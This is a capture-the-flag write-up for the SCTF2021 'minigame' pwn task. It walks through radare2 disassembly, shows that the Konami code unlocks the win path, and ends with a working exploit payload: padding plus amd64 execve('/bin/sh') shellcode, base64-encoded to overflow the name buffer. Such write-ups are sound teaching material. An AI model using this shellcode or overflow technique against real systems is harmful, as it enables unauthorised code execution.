# SCTF2021_minigame  
minigame pwn task student ctf 2021

# Inspect

```  
r2 minigame_66cc051203.elf  
[0x00000c60]> aaa  
[x] Analyze all flags starting with sym. and entry0 (aa)  
[x] Analyze function calls (aac)  
[x] Analyze len bytes of instructions for references (aar)  
[x] Finding and parsing C++ vtables (avrr)  
[x] Type matching analysis for all functions (aaft)  
[x] Propagate noreturn information (aanr)  
[x] Use -AA or aaaa to perform additional experimental analysis.  
[0x00000c60]> s main  
[0x00001d2b]> pdf  
```

We see 2 func for win (lose XD):

```  
│           0x00001eab      e865fdffff     call sym.lose_2  
│   │││╎│   0x00001e83      e890fcffff     call sym.lose_1  
```  
Let's check the lose_1:

```  
[0x00001d2b]> s sym.lose_1  
[0x00001b18]> pdf  
           ; CALL XREFS from main @ 0x1e43, 0x1e66, 0x1e83  
┌ 253: sym.lose_1 ();  
│           ; var signed int64_t var_1f4h @ rbp-0x1f4  
│           ; var int64_t var_1f0h @ rbp-0x1f0  
│           ; var int64_t canary @ rbp-0x8  
│           0x00001b18      55             push rbp  
│           0x00001b19      4889e5         mov rbp, rsp  
│           0x00001b1c      4881ec000200.  sub rsp, 0x200  
│           0x00001b23      64488b042528.  mov rax, qword fs:[0x28]  
│           0x00001b2c      488945f8       mov qword [canary], rax  
│           0x00001b30      31c0           xor eax, eax  
│           0x00001b32      488b05073e20.  mov rax, qword [obj.stdscr] ;
obj.__TMC_END__  
│                                                                      ;
[0x205940:8]=0  
│           0x00001b39      4889c7         mov rdi, rax  
│           0x00001b3c      e8afefffff     call sym.imp.werase  
│           0x00001b41      b800000000     mov eax, 0  
│           0x00001b46      e86df8ffff     call sym.princess  
│           0x00001b4b      488d8510feff.  lea rax, [var_1f0h]  
│           0x00001b52      488d15e71000.  lea rdx, [0x00002c40]       ;
"Princess:"  
│           0x00001b59      b93c000000     mov ecx, 0x3c               ; '<'  
│           0x00001b5e      4889c7         mov rdi, rax  
│           0x00001b61      4889d6         mov rsi, rdx  
│           0x00001b64      f348a5         rep movsq qword [rdi], qword ptr
[rsi]  
│           0x00001b67      c7850cfeffff.  mov dword [var_1f4h], 0  
│       ┌─< 0x00001b71      eb55           jmp 0x1bc8  
│       │   ; CODE XREF from sym.lose_1 @ 0x1bcf  
│      ┌──> 0x00001b73      488d8d10feff.  lea rcx, [var_1f0h]  
│      ╎│   0x00001b7a      8b850cfeffff   mov eax, dword [var_1f4h]  
│      ╎│   0x00001b80      4863d0         movsxd rdx, eax  
│      ╎│   0x00001b83      4889d0         mov rax, rdx  
│      ╎│   0x00001b86      48c1e002       shl rax, 2  
│      ╎│   0x00001b8a      4801d0         add rax, rdx  
│      ╎│   0x00001b8d      48c1e004       shl rax, 4  
│      ╎│   0x00001b91      488d1401       lea rdx, [rcx + rax]  
│      ╎│   0x00001b95      8b05cd3d2000   mov eax, dword [obj.row]    ;
[0x205968:4]=0  
│      ╎│   0x00001b9b      8d48ee         lea ecx, [rax - 0x12]  
│      ╎│   0x00001b9e      8b850cfeffff   mov eax, dword [var_1f4h]  
│      ╎│   0x00001ba4      01c8           add eax, ecx  
│      ╎│   0x00001ba6      4889d1         mov rcx, rdx  
│      ╎│   0x00001ba9      488d15920800.  lea rdx, [0x00002442]       ; "%s"  
│      ╎│   0x00001bb0      be28000000     mov esi, 0x28               ; '('  
│      ╎│   0x00001bb5      89c7           mov edi, eax  
│      ╎│   0x00001bb7      b800000000     mov eax, 0  
│      ╎│   0x00001bbc      e84ff0ffff     call sym.imp.mvprintw  
│      ╎│   0x00001bc1      83850cfeffff.  add dword [var_1f4h], 1  
│      ╎│   ; CODE XREF from sym.lose_1 @ 0x1b71  
│      ╎└─> 0x00001bc8      83bd0cfeffff.  cmp dword [var_1f4h], 5  
│      └──< 0x00001bcf      7ea2           jle 0x1b73  
│           0x00001bd1      488b05683d20.  mov rax, qword [obj.stdscr] ;
obj.__TMC_END__  
│                                                                      ;
[0x205940:8]=0  
│           0x00001bd8      beffffffff     mov esi, 0xffffffff         ; -1  
│           0x00001bdd      4889c7         mov rdi, rax  
│           0x00001be0      e81befffff     call sym.imp.wtimeout  
│           0x00001be5      488b05543d20.  mov rax, qword [obj.stdscr] ;
obj.__TMC_END__  
│                                                                      ;
[0x205940:8]=0  
│           0x00001bec      4889c7         mov rdi, rax  
│           0x00001bef      e8dcefffff     call sym.imp.wgetch  
│           0x00001bf4      b800000000     mov eax, 0  
│           0x00001bf9      e8aefcffff     call sym.game_over  
│           0x00001bfe      90             nop  
│           0x00001bff      488b45f8       mov rax, qword [canary]  
│           0x00001c03      644833042528.  xor rax, qword fs:[0x28]  
│       ┌─< 0x00001c0c      7405           je 0x1c13  
│       │   0x00001c0e      e82defffff     call sym.imp.__stack_chk_fail ;
void __stack_chk_fail(void)  
│       │   ; CODE XREF from sym.lose_1 @ 0x1c0c  
│       └─> 0x00001c13      c9             leave  
└           0x00001c14      c3             ret  
[0x00001b18]>  
```  
Nothing interesting.  
What about lose_2?

```  
[0x00001c15]> pdf  
           ; CALL XREF from main @ 0x1eab  
┌ 278: sym.lose_2 ();  
│           ; var signed int64_t var_244h @ rbp-0x244  
│           ; var int64_t var_240h @ rbp-0x240  
│           ; var int64_t canary @ rbp-0x8  
│           0x00001c15      55             push rbp  
│           0x00001c16      4889e5         mov rbp, rsp  
│           0x00001c19      4881ec500200.  sub rsp, 0x250  
│           0x00001c20      64488b042528.  mov rax, qword fs:[0x28]  
│           0x00001c29      488945f8       mov qword [canary], rax  
│           0x00001c2d      31c0           xor eax, eax  
│           0x00001c2f      0fb605163d20.  movzx eax, byte
[obj.is_cheat_active] ; [0x20594c:1]=0  
│           0x00001c36      84c0           test al, al  
│       ┌─< 0x00001c38      740f           je 0x1c49  
│       │   0x00001c3a      b800000000     mov eax, 0  
│       │   0x00001c3f      e86bfbffff     call sym.win  
│      ┌──< 0x00001c44      e9cc000000     jmp 0x1d15  
│      ││   ; CODE XREF from sym.lose_2 @ 0x1c38  
│      │└─> 0x00001c49      488b05f03c20.  mov rax, qword [obj.stdscr] ;
obj.__TMC_END__  
│      │                                                               ;
[0x205940:8]=0  
│      │    0x00001c50      4889c7         mov rdi, rax  
│      │    0x00001c53      e898eeffff     call sym.imp.werase  
│      │    0x00001c58      b800000000     mov eax, 0  
│      │    0x00001c5d      e856f7ffff     call sym.princess  
│      │    0x00001c62      488d85c0fdff.  lea rax, [var_240h]  
│      │    0x00001c69      488d15b01100.  lea rdx, str.Princess:      ;
0x2e20 ; "Princess:"  
│      │    0x00001c70      b946000000     mov ecx, 0x46               ; 'F'  
│      │    0x00001c75      4889c7         mov rdi, rax  
│      │    0x00001c78      4889d6         mov rsi, rdx  
│      │    0x00001c7b      f348a5         rep movsq qword [rdi], qword ptr
[rsi]  
│      │    0x00001c7e      c785bcfdffff.  mov dword [var_244h], 0  
│      │┌─< 0x00001c88      eb55           jmp 0x1cdf  
│      ││   ; CODE XREF from sym.lose_2 @ 0x1ce6  
│     ┌───> 0x00001c8a      488d8dc0fdff.  lea rcx, [var_240h]  
│     ╎││   0x00001c91      8b85bcfdffff   mov eax, dword [var_244h]  
│     ╎││   0x00001c97      4863d0         movsxd rdx, eax  
│     ╎││   0x00001c9a      4889d0         mov rax, rdx  
│     ╎││   0x00001c9d      48c1e002       shl rax, 2  
│     ╎││   0x00001ca1      4801d0         add rax, rdx  
│     ╎││   0x00001ca4      48c1e004       shl rax, 4  
│     ╎││   0x00001ca8      488d1401       lea rdx, [rcx + rax]  
│     ╎││   0x00001cac      8b05b63c2000   mov eax, dword [obj.row]    ;
[0x205968:4]=0  
│     ╎││   0x00001cb2      8d48ee         lea ecx, [rax - 0x12]  
│     ╎││   0x00001cb5      8b85bcfdffff   mov eax, dword [var_244h]  
│     ╎││   0x00001cbb      01c8           add eax, ecx  
│     ╎││   0x00001cbd      4889d1         mov rcx, rdx  
│     ╎││   0x00001cc0      488d157b0700.  lea rdx, [0x00002442]       ; "%s"  
│     ╎││   0x00001cc7      be28000000     mov esi, 0x28               ; '('  
│     ╎││   0x00001ccc      89c7           mov edi, eax  
│     ╎││   0x00001cce      b800000000     mov eax, 0  
│     ╎││   0x00001cd3      e838efffff     call sym.imp.mvprintw  
│     ╎││   0x00001cd8      8385bcfdffff.  add dword [var_244h], 1  
│     ╎││   ; CODE XREF from sym.lose_2 @ 0x1c88  
│     ╎│└─> 0x00001cdf      83bdbcfdffff.  cmp dword [var_244h], 6  
│     └───< 0x00001ce6      7ea2           jle 0x1c8a  
│      │    0x00001ce8      488b05513c20.  mov rax, qword [obj.stdscr] ;
obj.__TMC_END__  
│      │                                                               ;
[0x205940:8]=0  
│      │    0x00001cef      beffffffff     mov esi, 0xffffffff         ; -1  
│      │    0x00001cf4      4889c7         mov rdi, rax  
│      │    0x00001cf7      e804eeffff     call sym.imp.wtimeout  
│      │    0x00001cfc      488b053d3c20.  mov rax, qword [obj.stdscr] ;
obj.__TMC_END__  
│      │                                                               ;
[0x205940:8]=0  
│      │    0x00001d03      4889c7         mov rdi, rax  
│      │    0x00001d06      e8c5eeffff     call sym.imp.wgetch  
│      │    0x00001d0b      b800000000     mov eax, 0  
│      │    0x00001d10      e897fbffff     call sym.game_over  
│      │    ; CODE XREF from sym.lose_2 @ 0x1c44  
│      └──> 0x00001d15      488b45f8       mov rax, qword [canary]  
│           0x00001d19      644833042528.  xor rax, qword fs:[0x28]  
│       ┌─< 0x00001d22      7405           je 0x1d29  
│       │   0x00001d24      e817eeffff     call sym.imp.__stack_chk_fail ;
void __stack_chk_fail(void)  
│       │   ; CODE XREF from sym.lose_2 @ 0x1d22  
│       └─> 0x00001d29      c9             leave  
└           0x00001d2a      c3             ret  
[0x00001c15]>  
```

O_O we see the win fun, so if we got lose_2, we can win, but how?  
Answer: only if we have obj.is_cheat_active.

```  
│           0x00001c2f      0fb605163d20.  movzx eax, byte
[obj.is_cheat_active] ; [0x20594c:1]=0  
```

Ok, how we can get is_cheat_active? Let's check the sym.check_cheat func:

```  
[0x00000dd4]> pdf  
           ; CALL XREF from sym.start_game @ 0x113c  
┌ 428: sym.check_cheat ();  
│           0x00000dd4      55             push rbp  
│           0x00000dd5      4889e5         mov rbp, rsp  
│           0x00000dd8      0fb6056d4b20.  movzx eax, byte
[obj.is_cheat_active] ; [0x20594c:1]=0  
│           0x00000ddf      84c0           test al, al  
│       ┌─< 0x00000de1      0f8596010000   jne 0xf7d  
│       │   0x00000de7      8b05634b2000   mov eax, dword [obj.curr_progress]
; [0x205950:4]=0  
│       │   0x00000ded      83f809         cmp eax, 9  
│      ┌──< 0x00000df0      0f877a010000   ja case.default.0xe17  
│      ││   0x00000df6      89c0           mov eax, eax  
│      ││   0x00000df8      488d14850000.  lea rdx, [rax*4]  
│      ││   0x00000e00      488d05411600.  lea rax, [0x00002448]  
│      ││   0x00000e07      8b0402         mov eax, dword [rdx + rax]  
│      ││   0x00000e0a      4863d0         movsxd rdx, eax  
│      ││   0x00000e0d      488d05341600.  lea rax, [0x00002448]  
│      ││   0x00000e14      4801d0         add rax, rdx  
│      ││   ;-- switch  
│      ││   0x00000e17      ffe0           jmp rax                     ;
switch table (10 cases) at 0x2448  
│      ││   ;-- case 0...1:                                            ; from
0x00000e17  
│      ││   ; CODE XREF from sym.check_cheat @ 0xe17  
│      ││   0x00000e19      8b05454b2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│      ││   0x00000e1f      3d03010000     cmp eax, 0x103  
│     ┌───< 0x00000e24      740b           je 0xe31  
│     │││   0x00000e26      8b05384b2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│     │││   0x00000e2c      83f877         cmp eax, 0x77  
│    ┌────< 0x00000e2f      7514           jne 0xe45  
│    ││││   ; CODE XREF from sym.check_cheat @ 0xe24  
│    │└───> 0x00000e31      8b05194b2000   mov eax, dword [obj.curr_progress]
; [0x205950:4]=0  
│    │ ││   0x00000e37      83c001         add eax, 1  
│    │ ││   0x00000e3a      8905104b2000   mov dword [obj.curr_progress], eax
; [0x205950:4]=0  
│    │┌───< 0x00000e40      e939010000     jmp 0xf7e  
│    ││││   ; CODE XREF from sym.check_cheat @ 0xe2f  
│    └────> 0x00000e45      c705014b2000.  mov dword [obj.curr_progress], 0 ;
[0x205950:4]=0  
│    ┌────< 0x00000e4f      e92a010000     jmp 0xf7e  
│    ││││   ;-- case 2...3:                                            ; from
0x00000e17  
│    ││││   ; CODE XREF from sym.check_cheat @ 0xe17  
│    ││││   0x00000e54      8b050a4b2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│    ││││   0x00000e5a      3d02010000     cmp eax, 0x102  
│   ┌─────< 0x00000e5f      740b           je 0xe6c  
│   │││││   0x00000e61      8b05fd4a2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│   │││││   0x00000e67      83f873         cmp eax, 0x73  
│  ┌──────< 0x00000e6a      7514           jne 0xe80  
│  ││││││   ; CODE XREF from sym.check_cheat @ 0xe5f  
│  │└─────> 0x00000e6c      8b05de4a2000   mov eax, dword [obj.curr_progress]
; [0x205950:4]=0  
│  │ ││││   0x00000e72      83c001         add eax, 1  
│  │ ││││   0x00000e75      8905d54a2000   mov dword [obj.curr_progress], eax
; [0x205950:4]=0  
│  │┌─────< 0x00000e7b      e9fe000000     jmp 0xf7e  
│  ││││││   ; CODE XREF from sym.check_cheat @ 0xe6a  
│  └──────> 0x00000e80      c705c64a2000.  mov dword [obj.curr_progress], 0 ;
[0x205950:4]=0  
│  ┌──────< 0x00000e8a      e9ef000000     jmp 0xf7e  
│  ││││││   ;-- case 4:                                                ; from
0x00000e17  
│  ││││││   ; CODE XREF from sym.check_cheat @ 0xe17  
│  ││││││   0x00000e8f      8b05cf4a2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│  ││││││   0x00000e95      3d04010000     cmp eax, 0x104  
│ ┌───────< 0x00000e9a      740b           je 0xea7  
│ │││││││   0x00000e9c      8b05c24a2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│ │││││││   0x00000ea2      83f861         cmp eax, 0x61  
│ ────────< 0x00000ea5      7514           jne 0xebb  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xe9a  
│ └───────> 0x00000ea7      8b05a34a2000   mov eax, dword [obj.curr_progress]
; [0x205950:4]=0  
│  ││││││   0x00000ead      83c001         add eax, 1  
│  ││││││   0x00000eb0      89059a4a2000   mov dword [obj.curr_progress], eax
; [0x205950:4]=0  
│ ┌───────< 0x00000eb6      e9c3000000     jmp 0xf7e  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xea5  
│ ────────> 0x00000ebb      c7058b4a2000.  mov dword [obj.curr_progress], 0 ;
[0x205950:4]=0  
│ ────────< 0x00000ec5      e9b4000000     jmp 0xf7e  
│ │││││││   ;-- case 5:                                                ; from
0x00000e17  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xe17  
│ │││││││   0x00000eca      8b05944a2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│ │││││││   0x00000ed0      3d05010000     cmp eax, 0x105  
│ ────────< 0x00000ed5      740b           je 0xee2  
│ │││││││   0x00000ed7      8b05874a2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│ │││││││   0x00000edd      83f864         cmp eax, 0x64  
│ ────────< 0x00000ee0      7514           jne 0xef6  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xed5  
│ ────────> 0x00000ee2      8b05684a2000   mov eax, dword [obj.curr_progress]
; [0x205950:4]=0  
│ │││││││   0x00000ee8      83c001         add eax, 1  
│ │││││││   0x00000eeb      89055f4a2000   mov dword [obj.curr_progress], eax
; [0x205950:4]=0  
│ │││││││   ; DATA XREF from sym.b64_decode_ex @ 0x2168  
│ ────────< 0x00000ef1      e988000000     jmp 0xf7e  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xee0  
│ ────────> 0x00000ef6      c705504a2000.  mov dword [obj.curr_progress], 0 ;
[0x205950:4]=0  
│ ────────< 0x00000f00      eb7c           jmp 0xf7e  
│ │││││││   ;-- case 8:                                                ; from
0x00000e17  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xe17  
│ │││││││   0x00000f02      8b055c4a2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│ │││││││   0x00000f08      83f862         cmp eax, 0x62  
│ ────────< 0x00000f0b      7511           jne 0xf1e  
│ │││││││   0x00000f0d      8b053d4a2000   mov eax, dword [obj.curr_progress]
; [0x205950:4]=0  
│ │││││││   0x00000f13      83c001         add eax, 1  
│ │││││││   0x00000f16      8905344a2000   mov dword [obj.curr_progress], eax
; [0x205950:4]=0  
│ ────────< 0x00000f1c      eb60           jmp 0xf7e  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xf0b  
│ ────────> 0x00000f1e      c705284a2000.  mov dword [obj.curr_progress], 0 ;
[0x205950:4]=0  
│ ────────< 0x00000f28      eb54           jmp 0xf7e  
│ │││││││   ;-- case 9:                                                ; from
0x00000e17  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xe17  
│ │││││││   0x00000f2a      8b05344a2000   mov eax, dword [obj.ch]     ;
[0x205964:4]=0  
│ │││││││   0x00000f30      83f861         cmp eax, 0x61  
│ ────────< 0x00000f33      752f           jne 0xf64  
│ │││││││   0x00000f35      c605104a2000.  mov byte [obj.is_cheat_active], 1 ;
[0x20594c:1]=0  
│ │││││││   0x00000f3c      8b051e4a2000   mov eax, dword [obj.col]    ;
[0x205960:4]=0  
│ │││││││   0x00000f42      83e801         sub eax, 1  
│ │││││││   0x00000f45      488d0df41400.  lea rcx, [0x00002440]       ; "."  
│ │││││││   0x00000f4c      488d15ef1400.  lea rdx, [0x00002442]       ; "%s"  
│ │││││││   0x00000f53      89c6           mov esi, eax  
│ │││││││   0x00000f55      bf00000000     mov edi, 0  
│ │││││││   0x00000f5a      b800000000     mov eax, 0  
│ │││││││   0x00000f5f      e8acfcffff     call sym.imp.mvprintw  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xf33  
│ ────────> 0x00000f64      c705e2492000.  mov dword [obj.curr_progress], 0 ;
[0x205950:4]=0  
│ ────────< 0x00000f6e      eb0e           jmp 0xf7e  
│ │││││││   ;-- default:                                               ; from
0xe17  
│ │││││││   ; CODE XREFS from sym.check_cheat @ 0xdf0, 0xe17  
│ │││││└──> 0x00000f70      c705d6492000.  mov dword [obj.curr_progress], 0 ;
[0x205950:4]=0  
│ │││││ │   0x00000f7a      90             nop  
│ │││││┌──< 0x00000f7b      eb01           jmp 0xf7e  
│ │││││││   ; CODE XREF from sym.check_cheat @ 0xde1  
│ ││││││└─> 0x00000f7d      90             nop  
│ ││││││    ; XREFS: CODE 0x00000e40  CODE 0x00000e4f  CODE 0x00000e7b  CODE
0x00000e8a  CODE 0x00000eb6  CODE 0x00000ec5  
│ ││││││    ; XREFS: CODE 0x00000ef1  CODE 0x00000f00  CODE 0x00000f1c  CODE
0x00000f28  CODE 0x00000f6e  CODE 0x00000f7b  
│ └└└└└└──> 0x00000f7e      5d             pop rbp  
└           0x00000f7f      c3             ret  
```

Default button check. So we can reverse this cheat code:

UP UP DOWN DOWN LEFT RIGHT LEFT RIGHT B A

It's Konami Code...

Let's try, but It should be noted that we need to enter this cheat code before
the game is started.

# Get BOF

After we enter cheat and win the game, we can enter out name in BASE64 format.
And... get bof.  
I'll skip the overflow research, it's standard procedure.

So final payload:

```  
shellcraft amd64.linux.sh -f s  
python2 -c 'print("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua" + "jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7hri\x01\x01\x814\x24\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05")' | base64 -w0  
```  

Original writeup
(https://github.com/bimkos/SCTF2021_minigame/blob/main/README.md).